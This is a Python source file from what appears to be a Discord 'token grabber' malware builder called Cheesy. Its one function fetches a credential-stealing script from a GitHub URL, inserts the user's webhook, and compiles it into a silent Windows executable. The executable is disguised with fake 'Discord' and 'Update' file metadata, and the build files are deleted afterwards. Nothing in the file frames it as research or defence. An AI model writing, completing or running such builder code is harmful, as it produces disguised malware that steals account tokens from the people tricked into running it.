
import os
import shutil
import Cheesy
import requests
import base64
import random

from Crypto.Cipher import AES
from Crypto import Random
from colorama import Fore

from util.plugins.common import setTitle, installPackage


def TokenGrabberV2(WebHook, fileName):
    required = [
        "requests",
        "psutil",
        "pypiwin32",
        "pycryptodome",
        "pyinstaller",
        "pillow",
    ]
    installPackage(required)
    code = requests.get(
        "https://raw.githubusercontent.com/bananaman2020/cheesy/main/assets/main.py"
    ).text.replace("WEBHOOK_HERE", WebHook)
    with open(f"{fileName}.py", "w", encoding="utf8", errors="ignore") as f:
        f.write(code)

    print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
    setTitle(f"Creating {fileName}.exe")

    os.system(
        f"python -m nuitka Cheesy.py --msvc=latest --onefile --standalone --disable-console --remove-output --windows-company-name=GitHub --windows-product-name=Discord --windows-file-description=Update --windows-file-version=1.5 -o {fileName}.exe"
    )
    try:
        # clean build files
        shutil.move(
            f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe"
        )
        shutil.rmtree("build")
        shutil.rmtree("dist")
        shutil.rmtree("__pycache__")
        os.remove(f"{fileName}.spec")
        os.remove(f"{fileName}.py")
    except FileNotFoundError:
        pass

    print(f"\n{Fore.GREEN}File created as {fileName}.exe\n")
    input(
        f"{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}"
    )
    Cheesy.main()
